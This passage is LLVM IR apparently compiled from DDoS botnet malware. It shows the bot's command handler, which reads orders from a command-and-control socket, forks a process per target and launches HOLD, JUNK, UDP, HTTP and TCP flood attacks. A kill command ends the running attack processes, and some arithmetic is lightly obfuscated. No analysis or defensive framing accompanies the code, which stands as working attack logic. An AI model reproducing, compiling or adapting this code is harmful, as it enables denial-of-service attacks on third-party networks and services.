  %137 = icmp ne i8* %136, null
  br i1 %137, label %138, label %161

; <label>:138:                                    ; preds = %123
  %139 = load i32, i32* @mainCommSock, align 4
  %140 = load i8*, i8** %6, align 8
  %141 = load i32, i32* %7, align 4
  %142 = load i32, i32* %8, align 4
  %143 = call i32 (i32, i8*, ...) @sockprintf(i32 %139, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %140, i32 %141, i32 %142)
  %144 = load i8*, i8** %6, align 8
  %145 = call i8* @strtok(i8* %144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %145, i8** %9, align 8
  br label %146

; <label>:146:                                    ; preds = %158, %138
  %147 = load i8*, i8** %9, align 8
  %148 = icmp ne i8* %147, null
  br i1 %148, label %149, label %160

; <label>:149:                                    ; preds = %146
  %150 = call i32 @listFork()
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %158, label %152

; <label>:152:                                    ; preds = %149
  %153 = load i8*, i8** %9, align 8
  %154 = load i32, i32* %7, align 4
  %155 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %153, i32 %154, i32 %155)
  %156 = load i32, i32* @mainCommSock, align 4
  %157 = call i32 @close(i32 %156)
  call void @_exit(i32 0) #12
  unreachable

; <label>:158:                                    ; preds = %149
  %159 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %159, i8** %9, align 8
  br label %146

; <label>:160:                                    ; preds = %146
  br label %176

; <label>:161:                                    ; preds = %123
  %162 = call i32 @listFork()
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %161
  br label %646

; <label>:165:                                    ; preds = %161
  %166 = load i32, i32* @mainCommSock, align 4
  %167 = load i8*, i8** %6, align 8
  %168 = load i32, i32* %7, align 4
  %169 = load i32, i32* %8, align 4
  %170 = call i32 (i32, i8*, ...) @sockprintf(i32 %166, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %167, i32 %168, i32 %169)
  %171 = load i8*, i8** %6, align 8
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %171, i32 %172, i32 %173)
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = call i32 @close(i32 %174)
  call void @_exit(i32 0) #12
  unreachable

; <label>:176:                                    ; preds = %160
  br label %177

; <label>:177:                                    ; preds = %176, %101
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 0
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0)) #10
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %253, label %183

; <label>:183:                                    ; preds = %177
  %184 = load i32, i32* %3, align 4
  %185 = icmp slt i32 %184, 4
  br i1 %185, label %198, label %186

; <label>:186:                                    ; preds = %183
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  %191 = icmp slt i32 %190, 1
  br i1 %191, label %198, label %192

; <label>:192:                                    ; preds = %186
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #10
  %197 = icmp slt i32 %196, 1
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %192, %186, %183
  br label %646

; <label>:199:                                    ; preds = %192
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 1
  %202 = load i8*, i8** %201, align 8
  store i8* %202, i8** %10, align 8
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 2
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  store i32 %206, i32* %11, align 4
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 3
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #10
  store i32 %210, i32* %12, align 4
  %211 = load i8*, i8** %10, align 8
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %213 = icmp ne i8* %212, null
  br i1 %213, label %214, label %237

; <label>:214:                                    ; preds = %199
  %215 = load i32, i32* @mainCommSock, align 4
  %216 = load i8*, i8** %10, align 8
  %217 = load i32, i32* %11, align 4
  %218 = load i32, i32* %12, align 4
  %219 = call i32 (i32, i8*, ...) @sockprintf(i32 %215, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %216, i32 %217, i32 %218)
  %220 = load i8*, i8** %10, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %221, i8** %13, align 8
  br label %222

; <label>:222:                                    ; preds = %234, %214
  %223 = load i8*, i8** %13, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %236

; <label>:225:                                    ; preds = %222
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %234, label %228

; <label>:228:                                    ; preds = %225
  %229 = load i8*, i8** %13, align 8
  %230 = load i32, i32* %11, align 4
  %231 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %229, i32 %230, i32 %231)
  %232 = load i32, i32* @mainCommSock, align 4
  %233 = call i32 @close(i32 %232)
  call void @_exit(i32 0) #12
  unreachable

; <label>:234:                                    ; preds = %225
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %235, i8** %13, align 8
  br label %222

; <label>:236:                                    ; preds = %222
  br label %252

; <label>:237:                                    ; preds = %199
  %238 = call i32 @listFork()
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %241

; <label>:240:                                    ; preds = %237
  br label %646

; <label>:241:                                    ; preds = %237
  %242 = load i32, i32* @mainCommSock, align 4
  %243 = load i8*, i8** %10, align 8
  %244 = load i32, i32* %11, align 4
  %245 = load i32, i32* %12, align 4
  %246 = call i32 (i32, i8*, ...) @sockprintf(i32 %242, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %243, i32 %244, i32 %245)
  %247 = load i8*, i8** %10, align 8
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %247, i32 %248, i32 %249)
  %250 = load i32, i32* @mainCommSock, align 4
  %251 = call i32 @close(i32 %250)
  call void @_exit(i32 0) #12
  unreachable

; <label>:252:                                    ; preds = %236
  br label %253

; <label>:253:                                    ; preds = %252, %177
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 0
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @strcmp(i8* %256, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %258 = icmp ne i32 %257, 0
  br i1 %258, label %385, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i32, i32* %3, align 4
  %261 = icmp slt i32 %260, 6
  br i1 %261, label %307, label %262

; <label>:262:                                    ; preds = %259
  %263 = load i8**, i8*** %4, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 3
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #10
  %267 = icmp eq i32 %266, -1
  br i1 %267, label %307, label %268

; <label>:268:                                    ; preds = %262
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 2
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  %273 = icmp eq i32 %272, -1
  br i1 %273, label %307, label %274

; <label>:274:                                    ; preds = %268
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 4
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %307, label %280

; <label>:280:                                    ; preds = %274
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 5
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %307, label %286

; <label>:286:                                    ; preds = %280
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 5
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #10
  %291 = icmp sgt i32 %290, 65500
  br i1 %291, label %307, label %292

; <label>:292:                                    ; preds = %286
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 4
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  %297 = icmp sgt i32 %296, 32
  br i1 %297, label %307, label %298

; <label>:298:                                    ; preds = %292
  %299 = load i32, i32* %3, align 4
  %300 = icmp eq i32 %299, 7
  br i1 %300, label %301, label %308

; <label>:301:                                    ; preds = %298
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 6
  %304 = load i8*, i8** %303, align 8
  %305 = call i32 @atoi(i8* %304) #10
  %306 = icmp slt i32 %305, 1
  br i1 %306, label %307, label %308

; <label>:307:                                    ; preds = %301, %292, %286, %280, %274, %268, %262, %259
  br label %646

; <label>:308:                                    ; preds = %301, %298
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 1
  %311 = load i8*, i8** %310, align 8
  store i8* %311, i8** %14, align 8
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 2
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  store i32 %315, i32* %15, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 3
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  store i32 %319, i32* %16, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  store i32 %323, i32* %17, align 4
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 5
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #10
  store i32 %327, i32* %18, align 4
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 7
  br i1 %329, label %330, label %335

; <label>:330:                                    ; preds = %308
  %331 = load i8**, i8*** %4, align 8
  %332 = getelementptr inbounds i8*, i8** %331, i64 6
  %333 = load i8*, i8** %332, align 8
  %334 = call i32 @atoi(i8* %333) #10
  br label %336

; <label>:335:                                    ; preds = %308
  br label %336

; <label>:336:                                    ; preds = %335, %330
  %337 = phi i32 [ %334, %330 ], [ 10, %335 ]
  store i32 %337, i32* %19, align 4
  %338 = load i8*, i8** %14, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %340 = icmp ne i8* %339, null
  br i1 %340, label %341, label %366

; <label>:341:                                    ; preds = %336
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %14, align 8
  %344 = load i32, i32* %16, align 4
  %345 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i32 0, i32 0), i8* %343, i32 %344)
  %346 = load i8*, i8** %14, align 8
  %347 = call i8* @strtok(i8* %346, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %347, i8** %20, align 8
  br label %348

; <label>:348:                                    ; preds = %363, %341
  %349 = load i8*, i8** %20, align 8
  %350 = icmp ne i8* %349, null
  br i1 %350, label %351, label %365

; <label>:351:                                    ; preds = %348
  %352 = call i32 @listFork()
  %353 = icmp ne i32 %352, 0
  br i1 %353, label %363, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i8*, i8** %20, align 8
  %356 = load i32, i32* %15, align 4
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %355, i32 %356, i32 %357, i32 %358, i32 %359, i32 %360)
  %361 = load i32, i32* @mainCommSock, align 4
  %362 = call i32 @close(i32 %361)
  call void @_exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %351
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %364, i8** %20, align 8
  br label %348

; <label>:365:                                    ; preds = %348
  br label %384

; <label>:366:                                    ; preds = %336
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %366
  br label %646

; <label>:370:                                    ; preds = %366
  %371 = load i32, i32* @mainCommSock, align 4
  %372 = load i8*, i8** %14, align 8
  %373 = load i32, i32* %15, align 4
  %374 = load i32, i32* %16, align 4
  %375 = call i32 (i32, i8*, ...) @sockprintf(i32 %371, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i32 0, i32 0), i8* %372, i32 %373, i32 %374)
  %376 = load i8*, i8** %14, align 8
  %377 = load i32, i32* %15, align 4
  %378 = load i32, i32* %16, align 4
  %379 = load i32, i32* %17, align 4
  %380 = load i32, i32* %18, align 4
  %381 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %376, i32 %377, i32 %378, i32 %379, i32 %380, i32 %381)
  %382 = load i32, i32* @mainCommSock, align 4
  %383 = call i32 @close(i32 %382)
  call void @_exit(i32 0) #12
  unreachable

; <label>:384:                                    ; preds = %365
  br label %385

; <label>:385:                                    ; preds = %384, %253
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 0
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @strcmp(i8* %388, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0)) #10
  %390 = icmp ne i32 %389, 0
  br i1 %390, label %447, label %391

; <label>:391:                                    ; preds = %385
  %392 = load i32, i32* %3, align 4
  %393 = icmp slt i32 %392, 3
  br i1 %393, label %400, label %394

; <label>:394:                                    ; preds = %391
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 2
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #10
  %399 = icmp slt i32 %398, 1
  br i1 %399, label %400, label %401

; <label>:400:                                    ; preds = %394, %391
  br label %646

; <label>:401:                                    ; preds = %394
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 1
  %404 = load i8*, i8** %403, align 8
  store i8* %404, i8** %21, align 8
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 2
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #10
  store i32 %408, i32* %22, align 4
  %409 = load i8*, i8** %21, align 8
  %410 = call i8* @strstr(i8* %409, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %433

; <label>:412:                                    ; preds = %401
  %413 = load i32, i32* @mainCommSock, align 4
  %414 = load i8*, i8** %21, align 8
  %415 = load i32, i32* %22, align 4
  %416 = call i32 (i32, i8*, ...) @sockprintf(i32 %413, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %414, i32 %415)
  %417 = load i8*, i8** %21, align 8
  %418 = call i8* @strtok(i8* %417, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %418, i8** %23, align 8
  br label %419

; <label>:419:                                    ; preds = %430, %412
  %420 = load i8*, i8** %23, align 8
  %421 = icmp ne i8* %420, null
  br i1 %421, label %422, label %432

; <label>:422:                                    ; preds = %419
  %423 = call i32 @listFork()
  %424 = icmp ne i32 %423, 0
  br i1 %424, label %430, label %425

; <label>:425:                                    ; preds = %422
  %426 = load i8*, i8** %21, align 8
  %427 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %426, i32 %427)
  %428 = load i32, i32* @mainCommSock, align 4
  %429 = call i32 @close(i32 %428)
  call void @_exit(i32 0) #12
  unreachable

; <label>:430:                                    ; preds = %422
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %431, i8** %23, align 8
  br label %419

; <label>:432:                                    ; preds = %419
  br label %446

; <label>:433:                                    ; preds = %401
  %434 = call i32 @listFork()
  %435 = icmp ne i32 %434, 0
  br i1 %435, label %436, label %437

; <label>:436:                                    ; preds = %433
  br label %646

; <label>:437:                                    ; preds = %433
  %438 = load i32, i32* @mainCommSock, align 4
  %439 = load i8*, i8** %21, align 8
  %440 = load i32, i32* %22, align 4
  %441 = call i32 (i32, i8*, ...) @sockprintf(i32 %438, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %439, i32 %440)
  %442 = load i8*, i8** %21, align 8
  %443 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %442, i32 %443)
  %444 = load i32, i32* @mainCommSock, align 4
  %445 = call i32 @close(i32 %444)
  call void @_exit(i32 0) #12
  unreachable

; <label>:446:                                    ; preds = %432
  br label %447

; <label>:447:                                    ; preds = %446, %385
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %586, label %453

; <label>:453:                                    ; preds = %447
  %454 = load i32, i32* %3, align 4
  %455 = icmp slt i32 %454, 6
  br i1 %455, label %498, label %456

; <label>:456:                                    ; preds = %453
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 3
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  %461 = icmp eq i32 %460, -1
  br i1 %461, label %498, label %462

; <label>:462:                                    ; preds = %456
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #10
  %467 = icmp eq i32 %466, -1
  br i1 %467, label %498, label %468

; <label>:468:                                    ; preds = %462
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 4
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @atoi(i8* %471) #10
  %473 = icmp eq i32 %472, -1
  br i1 %473, label %498, label %474

; <label>:474:                                    ; preds = %468
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 4
  %477 = load i8*, i8** %476, align 8
  %478 = call i32 @atoi(i8* %477) #10
  %479 = icmp sgt i32 %478, 32
  br i1 %479, label %498, label %480

; <label>:480:                                    ; preds = %474
  %481 = load i32, i32* %3, align 4
  %482 = icmp sgt i32 %481, 6
  br i1 %482, label %483, label %489

; <label>:483:                                    ; preds = %480
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 6
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  %488 = icmp slt i32 %487, 0
  br i1 %488, label %498, label %489

; <label>:489:                                    ; preds = %483, %480
  %490 = load i32, i32* %3, align 4
  %491 = icmp eq i32 %490, 8
  br i1 %491, label %492, label %499

; <label>:492:                                    ; preds = %489
  %493 = load i8**, i8*** %4, align 8
  %494 = getelementptr inbounds i8*, i8** %493, i64 7
  %495 = load i8*, i8** %494, align 8
  %496 = call i32 @atoi(i8* %495) #10
  %497 = icmp slt i32 %496, 1
  br i1 %497, label %498, label %499

; <label>:498:                                    ; preds = %492, %483, %474, %468, %462, %456, %453
  br label %646

; <label>:499:                                    ; preds = %492, %489
  %500 = load i8**, i8*** %4, align 8
  %501 = getelementptr inbounds i8*, i8** %500, i64 1
  %502 = load i8*, i8** %501, align 8
  store i8* %502, i8** %24, align 8
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 2
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @atoi(i8* %505) #10
  store i32 %506, i32* %25, align 4
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 3
  %509 = load i8*, i8** %508, align 8
  %510 = call i32 @atoi(i8* %509) #10
  store i32 %510, i32* %26, align 4
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 4
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* %513) #10
  store i32 %514, i32* %27, align 4
  %515 = load i8**, i8*** %4, align 8
  %516 = getelementptr inbounds i8*, i8** %515, i64 5
  %517 = load i8*, i8** %516, align 8
  store i8* %517, i8** %28, align 8
  %518 = load i32, i32* %3, align 4
  %519 = icmp eq i32 %518, 8
  br i1 %519, label %520, label %525

; <label>:520:                                    ; preds = %499
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 7
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #10
  br label %526

; <label>:525:                                    ; preds = %499
  br label %526

; <label>:526:                                    ; preds = %525, %520
  %527 = phi i32 [ %524, %520 ], [ 10, %525 ]
  store i32 %527, i32* %29, align 4
  %528 = load i32, i32* %3, align 4
  %529 = icmp sgt i32 %528, 6
  br i1 %529, label %530, label %535

; <label>:530:                                    ; preds = %526
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 6
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #10
  br label %536

; <label>:535:                                    ; preds = %526
  br label %536

; <label>:536:                                    ; preds = %535, %530
  %537 = phi i32 [ %534, %530 ], [ 0, %535 ]
  store i32 %537, i32* %30, align 4
  %538 = load i8*, i8** %24, align 8
  %539 = call i8* @strstr(i8* %538, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %540 = icmp ne i8* %539, null
  br i1 %540, label %541, label %567

; <label>:541:                                    ; preds = %536
  %542 = load i32, i32* @mainCommSock, align 4
  %543 = load i8*, i8** %24, align 8
  %544 = load i32, i32* %26, align 4
  %545 = call i32 (i32, i8*, ...) @sockprintf(i32 %542, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %543, i32 %544)
  %546 = load i8*, i8** %24, align 8
  %547 = call i8* @strtok(i8* %546, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %547, i8** %31, align 8
  br label %548

; <label>:548:                                    ; preds = %564, %541
  %549 = load i8*, i8** %31, align 8
  %550 = icmp ne i8* %549, null
  br i1 %550, label %551, label %566

; <label>:551:                                    ; preds = %548
  %552 = call i32 @listFork()
  %553 = icmp ne i32 %552, 0
  br i1 %553, label %564, label %554

; <label>:554:                                    ; preds = %551
  %555 = load i8*, i8** %31, align 8
  %556 = load i32, i32* %25, align 4
  %557 = load i32, i32* %26, align 4
  %558 = load i32, i32* %27, align 4
  %559 = load i8*, i8** %28, align 8
  %560 = load i32, i32* %30, align 4
  %561 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %555, i32 %556, i32 %557, i32 %558, i8* %559, i32 %560, i32 %561)
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = call i32 @close(i32 %562)
  call void @_exit(i32 0) #12
  unreachable

; <label>:564:                                    ; preds = %551
  %565 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %565, i8** %31, align 8
  br label %548

; <label>:566:                                    ; preds = %548
  br label %585

; <label>:567:                                    ; preds = %536
  %568 = call i32 @listFork()
  %569 = icmp ne i32 %568, 0
  br i1 %569, label %570, label %571

; <label>:570:                                    ; preds = %567
  br label %646

; <label>:571:                                    ; preds = %567
  %572 = load i32, i32* @mainCommSock, align 4
  %573 = load i8*, i8** %24, align 8
  %574 = load i32, i32* %26, align 4
  %575 = call i32 (i32, i8*, ...) @sockprintf(i32 %572, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i32 0, i32 0), i8* %573, i32 %574)
  %576 = load i8*, i8** %24, align 8
  %577 = load i32, i32* %25, align 4
  %578 = load i32, i32* %26, align 4
  %579 = load i32, i32* %27, align 4
  %580 = load i8*, i8** %28, align 8
  %581 = load i32, i32* %30, align 4
  %582 = load i32, i32* %29, align 4
  call void @sendTCP(i8* %576, i32 %577, i32 %578, i32 %579, i8* %580, i32 %581, i32 %582)
  %583 = load i32, i32* @mainCommSock, align 4
  %584 = call i32 @close(i32 %583)
  call void @_exit(i32 0) #12
  unreachable

; <label>:585:                                    ; preds = %566
  br label %586

; <label>:586:                                    ; preds = %585, %447
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 0
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @strcmp(i8* %589, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #10
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %639, label %592

; <label>:592:                                    ; preds = %586
  store i32 0, i32* %32, align 4
  store i64 0, i64* %33, align 8
  br label %593

; <label>:593:                                    ; preds = %623, %592
  %594 = load i64, i64* %33, align 8
  %595 = load i64, i64* @numpids, align 8
  %596 = icmp ult i64 %594, %595
  br i1 %596, label %597, label %628

; <label>:597:                                    ; preds = %593
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %33, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = icmp ne i32 %601, 0
  br i1 %602, label %603, label %622

; <label>:603:                                    ; preds = %597
  %604 = load i32*, i32** @pids, align 8
  %605 = load i64, i64* %33, align 8
  %606 = getelementptr inbounds i32, i32* %604, i64 %605
  %607 = load i32, i32* %606, align 4
  %608 = call i32 @getpid() #4
  %609 = icmp ne i32 %607, %608
  br i1 %609, label %610, label %622

; <label>:610:                                    ; preds = %603
  %611 = load i32*, i32** @pids, align 8
  %612 = load i64, i64* %33, align 8
  %613 = getelementptr inbounds i32, i32* %611, i64 %612
  %614 = load i32, i32* %613, align 4
  %615 = call i32 @kill(i32 %614, i32 9) #4
  %616 = load i32, i32* %32, align 4
  %617 = sub i32 0, %616
  %618 = sub i32 0, 1
  %619 = add i32 %617, %618
  %620 = sub i32 0, %619
  %621 = add nsw i32 %616, 1
  store i32 %620, i32* %32, align 4
  br label %622

; <label>:622:                                    ; preds = %610, %603, %597
  br label %623

; <label>:623:                                    ; preds = %622
  %624 = load i64, i64* %33, align 8
  %625 = sub i64 0, 1
  %626 = sub i64 %624, %625
  %627 = add i64 %624, 1
  store i64 %626, i64* %33, align 8
  br label %593

; <label>:628:                                    ; preds = %593
  %629 = load i32, i32* %32, align 4
  %630 = icmp sgt i32 %629, 0
  br i1 %630, label %631, label %635

; <label>:631:                                    ; preds = %628
  %632 = load i32, i32* @mainCommSock, align 4
  %633 = load i32, i32* %32, align 4
  %634 = call i32 (i32, i8*, ...) @sockprintf(i32 %632, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i32 0, i32 0), i32 %633)
  br label %638

; <label>:635:                                    ; preds = %628
  %636 = load i32, i32* @mainCommSock, align 4
  %637 = call i32 (i32, i8*, ...) @sockprintf(i32 %636, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0))
  br label %638

; <label>:638:                                    ; preds = %635, %631
  br label %639

; <label>:639:                                    ; preds = %638, %586
  %640 = load i8**, i8*** %4, align 8
  %641 = getelementptr inbounds i8*, i8** %640, i64 0
  %642 = load i8*, i8** %641, align 8
  %643 = call i32 @strcmp(i8* %642, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0)) #10
  %644 = icmp ne i32 %643, 0
  br i1 %644, label %646, label %645

; <label>:645:                                    ; preds = %639
  call void @exit(i32 0) #14
  unreachable

; <label>:646:                                    ; preds = %639, %570, %498, %436, %400, %369, %307, %240, %198, %164, %122, %97, %92, %87, %74, %62, %48, %39
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
